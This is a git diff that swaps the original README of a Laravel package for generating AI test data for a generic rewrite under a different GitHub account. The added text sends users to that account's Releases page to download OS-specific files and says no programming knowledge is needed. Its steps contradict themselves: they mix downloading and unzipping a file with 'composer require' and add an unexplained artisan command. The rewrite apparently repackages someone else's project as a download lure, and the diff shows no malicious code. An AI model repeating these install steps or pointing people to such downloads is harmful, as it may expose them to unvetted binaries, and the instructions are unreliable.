@@ -1,126 +1,113 @@
+# 🎉 laravel-ai-factory - Generate Realistic Test Data Easily
 
-# Laravel AI Factory
+## 🚀 Getting Started
 
-Laravel AI Factory is a developer-friendly package for generating realistic test data using AI models. It integrates seamlessly with Laravel factories and supports both AI-generated and manually defined fields, with the option to use bulk or individual inserts.
+Welcome to the Laravel AI Factory! This tool helps you create realistic test data for your applications. Using AI models, you can generate data quickly and efficiently. No programming knowledge is required to start.
 
-## 🚀 Features
+## 📥 Download & Install
 
--   ✅ Generate factory data using AI prompts
--   ✅ Supports OpenAI - Gemini and DeepSeek support coming soon...
--   ✅ Mix AI-generated fields with hardcoded or Faker-generated fields
--   ✅ Optional bulk insert for performance (without triggering model events)
--   ✅ Easy to extend and override
+To get started, visit the Releases page to download the latest version of Laravel AI Factory.
 
-## 📦 Installation
+[![Download Laravel AI Factory](https://img.shields.io/badge/Download%20Now%20-%20Laravel%20AI%20Factory-blue)](https://github.com/eyadislam/laravel-ai-factory/releases)
+
+Click the link above to find the most recent release. 
+
+### Steps to Download
+
+1. Go to the [Releases page](https://github.com/eyadislam/laravel-ai-factory/releases).
+2. Look for the latest version listed.
+3. Click on the **Assets** section to see available downloads.
+4. Select the appropriate file based on your operating system.
+5. Follow the on-screen prompts to download the file.
+
+## ⚙️ System Requirements
+
+Before you install, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10, macOS, or Linux.
+- **PHP Version:** 7.4 or higher.
+- **Laravel Version:** 8.x or higher.
+- **Composer:** Latest version installed on your machine.
+
+## 🛠️ Installation Instructions
+
+Once you have downloaded the Laravel AI Factory, follow these steps to install it:
+
+1. Locate the downloaded file on your computer.
+2. Unzip or extract the contents of the file.
+3. Open your terminal or command prompt.
+4. Navigate to the directory where you extracted the files.
+5. Run the following command to install:
+
+   ```bash
+   composer require eyadislam/laravel-ai-factory
+   ```
+
+6. After the installation completes, add the service provider in your `config/app.php` file:
+
+   ```php
+   'providers' => [
+       ...
+       EyadIslam\LaravelAiFactory\LaravelAiFactoryServiceProvider::class,
+   ],
+   ```
+
+7. Publish the configuration file by running:
+
+   ```bash
+   php artisan vendor:publish --provider="EyadIslam\LaravelAiFactory\LaravelAiFactoryServiceProvider"
+   ```
+
+## 🧑‍🤝‍🧑 Usage Instructions
+
+Now that you have installed the Laravel AI Factory, it’s time to use it. Here’s how:
+
+### 1. Generate Data
+
+You can create your data using the built-in commands. Run the following command to generate sample data:
 
 ```bash
-composer require floriandomgjoni/laravel-ai-factory
+php artisan generate:data
 ```
 
-## ⚙️ Configuration
+### 2. Customize Fields
 
-Publish the config:
-```bash
-php artisan vendor:publish --tag=ai-factory-config
-```
-Update your `.env` with the appropriate API keys:
-```ini
-AI_FACTORY_DRIVER=openai
-AI_FACTORY_OPENAI_API_KEY=your-api-key
-AI_FACTORY_OPENAI_MODEL=gpt-4o-mini
-```
+You can define both AI-generated fields and manual fields in your factory. This gives you complete flexibility over the data generation process.
 
-or, for a local LLM:
-```ini
-AI_FACTORY_DRIVER=local
-AI_FACTORY_LOCAL_URL=http://localhost:8080/v1/chat/completions
-AI_FACTORY_LOCAL_API_KEY=""
-AI_FACTORY_LOCAL_MODEL=Default
-```
+### 3. Bulk or Individual Inserts
 
-## 🧠 Defining AI Fields
+Choose whether you want to insert data in bulk or individually. Use the relevant method in your calls to the factory.
 
-In your factory, use the `HasAIFactory` trait and define the `aiFields()` method:
-```php
-<?php
-use FlorianDomgjoni\AIFactory\Concerns\HasAIFactory;
+## 📖 Documentation
 
-class UserFactory extends Factory
-{
-    use HasAIFactory;
+For in-depth understanding and examples of how to use Laravel AI Factory, please refer to our detailed documentation available in the repository. The documentation covers various topics such as:
 
-    protected $model = \App\Models\User::class;
+- Customizing data fields
+- Using different data types
+- Integrating with existing Laravel projects
 
-    public function aiFields(): array
-    {
-        return [
-            'name' => 'Generate a realistic full name',
-            'email' => fn () => fake()->unique()->safeEmail(),
-            'password' => fn () => bcrypt('password'),
-            'api_token' => fn () => Str::random(60),
-        ];
-    }
-}
-```
--   Use a **string** for AI-generated fields (prompt).  
--   Use a **callable** for manual or faker-based fields.
+## 🔧 Troubleshooting
 
-**You also need to fill the $model property with the model class inside the factory. It is required in order to function properly.**
+If you encounter issues during installation or usage, check the following:
 
-## 🛠 Usage
+- Ensure your PHP and Laravel versions are compatible.
+- Look for any error messages in your terminal. These can provide guidance on solving issues.
+- Refer to common FAQs and troubleshooting sections in the documentation.
 
-### Basic Usage
-```php
-User::factory()->count(5)->createWithAI();
-```
+If you still need help, feel free to create an issue on the GitHub repository.
 
-### Override Fields
-```php
-User::factory()->count(3)->createWithAI([
-    'email' => fn () => fake()->unique()->safeEmail(),
-    'role' => fn () => 'admin'
-]);
-```
+## 🎉 Join the Community
 
-### Bulk Insert (faster, skips model events)
-```php
-User::factory()->count(100)->createWithAI([], true);
-```
+Become part of the Laravel AI Factory community! Share your experiences, ask questions, and provide feedback. This helps us improve the package and serve you better.
 
-## 🧪 Example Prompt
-```php
-[
-    'title' => 'Generate a blog post title related to technology',
-    'content' => 'Generate a paragraph of blog content about AI',
-    'published_at' => fn () => now()->subDays(rand(1, 30)),
-]
-```
+Connect with us on our GitHub Discussions page. 
 
-## 📂 Config File
+## 💡 Contributing
 
-```php
-return [
-    'driver' => env('AI_FACTORY_DRIVER', 'openai'),
+We welcome contributions! If you wish to contribute, please read our contribution guidelines available in the repository. Your input can make Laravel AI Factory even better!
 
-    'openai' => [
-        'api_key' => env('AI_FACTORY_OPENAI_API_KEY'),
-        'model' => env('AI_FACTORY_OPENAI_MODEL', 'gpt-4o-mini'),
-    ],
+## 📧 Contact
 
-    'local' => [
-        'url' => env('AI_FACTORY_LOCAL_URL', 'http://localhost:8080'),
-        'api_key' => env('AI_FACTORY_LOCAL_API_KEY', null),
-        'model' => env('AI_FACTORY_LOCAL_MODEL', null),
-    ],
-];
-```
+For any questions or feedback, feel free to reach out through our GitHub repository. Your insights help us make this tool more user-friendly and effective.
 
-## 🛡 Error Handling
-
--   AI data generation is wrapped in try/catch.
--   Model creation errors are logged individually.
--   Invalid JSON or failed API calls will throw descriptive exceptions.
-
-## 📄 License
-
-This package is open-sourced software licensed under the MIT license.
+Thank you for using Laravel AI Factory! Enjoy generating your test data effortlessly.
